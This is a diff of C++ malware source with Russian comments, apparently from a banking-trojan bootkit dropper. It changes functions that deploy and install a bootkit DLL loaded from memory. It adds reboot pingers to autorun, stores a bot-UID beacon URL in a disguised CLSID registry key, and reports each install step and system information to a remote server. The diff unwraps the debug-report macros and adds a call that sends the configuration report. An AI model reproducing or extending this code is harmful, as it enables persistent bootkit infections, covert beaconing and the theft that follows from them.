@@ -104,72 +104,18 @@ void AddRebootPingDllToAutorun()
 	if (install == NULL) return;
 
 	// 123_d начало вызова Install для установки ping dll
-	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("123_d"));
+	DebugReportStepByName("123_d");
 
 	BOOL install_result = install(dll_body, dll_body_size);
 	if (install_result)
 	{
 		// 124_d вызов Install для установки ping dll вернул TRUE
-		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("124_d"));
+		DebugReportStepByName("124_d");
 	}
 
 	BKIDBG("AddRebootPingDllToAutorun", "Finished with install_result=%d.", install_result);
 }
 
-void GetDriverUrl(char * UrlBuffer, DWORD UrlBufferSize)
-{
-	CHAR BotUid[200];
-	
-	m_memset(BotUid, 0, sizeof(BotUid));
-	m_memset(UrlBuffer, 0, UrlBufferSize);
-
-	GenerateUid(BotUid);
-
-	PStrings Fields = Strings::Create();
-	AddURLParam(Fields, "cmd", "step");
-	AddURLParam(Fields, "uid", BotUid);
-	AddURLParam(Fields, "step", "170_dr"); //170_dr таймер драйвера
-
-	PCHAR Params = Strings::GetText(Fields, "&");
-	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);
-	
-	BKIDBG("GetDriverUrl", "Url='%s':%u (buffer_size=%u)", URL, STR::Length(URL),
-		UrlBufferSize);
-
-	if (UrlBufferSize < (STR::Length(URL) - 1)) return;
-
-	m_lstrcpy(UrlBuffer, URL);
-
-	STR::Free(URL);
-	STR::Free(Params);
-	Strings::Free(Fields);
-}
-
-bool SaveUrlForBootkitDriver()
-{
-	WCHAR  key_path[] = L"SOFTWARE\\Classes\\CLSID\\{8CB0A413-0585-4886-B110-004B3BCAA9A8}";
-	CHAR   url[500];
-	DWORD	 url_length = 0;
-	HKEY   key;
-	DWORD  opt = 0;
-
-	GetDriverUrl(url, sizeof(url));
-
-	DWORD key_created = (DWORD)pRegCreateKeyExW(HKEY_LOCAL_MACHINE, key_path, 0, NULL, 0, KEY_WRITE, NULL, &key, &opt);
-	BKIDBG("SaveUrlForBootkitDriver", "RegCreateKeyExW return 0x%X", key_created);
-	if (key_created != ERROR_SUCCESS) return false;
-
-	// Сохраняем на всякий пожарный с 0 в конце
-	DWORD url_value_set = (DWORD)pRegSetValueExW(key, L"ID", 0, REG_BINARY, (const BYTE*)&url[0], 
-		(DWORD)plstrlenA(url));
-	BKIDBG("SaveUrlForBootkitDriver", "RegSetValueExW return 0x%X", url_value_set);
-	if (url_value_set != ERROR_SUCCESS) return false;
-
-	BKIDBG("SaveUrlForBootkitDriver", "Url key set (url=%s).", url);
-
-	pRegCloseKey(key);
-	return true;
-}
 
 enum TargetPlatform
 {
@@ -293,7 +239,7 @@ bool BkDeployAndInstallDll()
 	ULONG ret = -1;
 	
 	// 100_d запуск дропера
-	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("100_d"));
+	DebugReportStepByName("100_d");
 
 	// Проверка целевой платформы.
 	if (CurrentPlatformAllowed() == false)
@@ -303,19 +249,13 @@ bool BkDeployAndInstallDll()
 	}
 
 	// 109_d точка прохождения целевой платформы
-	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("109_d"));
+	DebugReportStepByName("109_d");
 
-	BKIDBG("DeployAndInstallBkDll", "doing DebugReportStep1 on start.");
-	PP_DBGRPT_FUNCTION_CALL(DebugReportStep1());
-
-	BKIDBG("DeployAndInstallBkDll", "doing DebugReportUpdateNtldrCheckSum on start.");
-	PP_DBGRPT_FUNCTION_CALL(DebugReportUpdateNtldrCheckSum());
-
-	BKIDBG("DeployAndInstallBkDll", "doing sending system information.");
-	PP_DBGRPT_FUNCTION_CALL(DebugReportCreateConfigReportAndSend());
+	DebugReportSystem();
+	DebugReportUpdateNtldrCheckSum();
 
 	// 110_d - запуск DeployAndInstallBkDll
-	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("110_d"));
+	DebugReportStepByName("110_d");
 
 	BKIDBG("DeployAndInstallBkDll", "looking for setup dll...");
 
@@ -331,9 +271,7 @@ bool BkDeployAndInstallDll()
 		BKIDBG("DeployAndInstallBkDll", "MLoadLibrary() result=0x%X", hLib);
 		if (hLib == NULL) return false;
 		
-		bool uid_saved = false;
-		
-		PP_DBGRPT_FUNCTION_CALL(uid_saved = SaveUrlForBootkitDriver());
+		bool uid_saved = DebugReportSaveUrlForBootkitDriver();
 		BKIDBG("DeployAndInstallBkDll", "UID saved for bootkit.(result=%d)", uid_saved);
 
 		BKIDBG("DeployAndInstallBkDll", "Looking for BkInstall function ....");
@@ -341,7 +279,7 @@ bool BkDeployAndInstallDll()
 		if ( BkInstall = (ULONG(*)())MemoryGetProcAddress(hLib,"BkInstall")  )
 		{
 			// 111_d - запуск установки
-			PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("111_d"));
+			DebugReportStepByName("111_d");
 
 			BKIDBG("DeployAndInstallBkDll", "BkInstall function found 0x%X. Calling it.", BkInstall);
 			ret = BkInstall();
@@ -350,15 +288,16 @@ bool BkDeployAndInstallDll()
 			if (ret == ERROR_SUCCESS)
 			{
 				//112_d установка успешна
-				PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("112_d"));
+				DebugReportStepByName("112_d");
 
 				BKIDBG("DeployAndInstallBkDll", "add pinger to autorun...");
-				PP_DBGRPT_FUNCTION_CALL(AddRebootPingToAutorun());
-				PP_DBGRPT_FUNCTION_CALL(AddRebootPingDllToAutorun());
+				AddRebootPingToAutorun();
+				AddRebootPingDllToAutorun();
+				DebugReportCreateConfigReportAndSend();
 			}
 
-			BKIDBG("DeployAndInstallBkDll", "Doing DebugReportStep2");
-			PP_DBGRPT_FUNCTION_CALL(DebugReportStep2(ret));
+			BKIDBG("DeployAndInstallBkDll", "Doing DebugReportBkInstallCode");
+			DebugReportBkInstallCode(ret);
 		}
 		MemoryFreeLibrary(hLib);
 
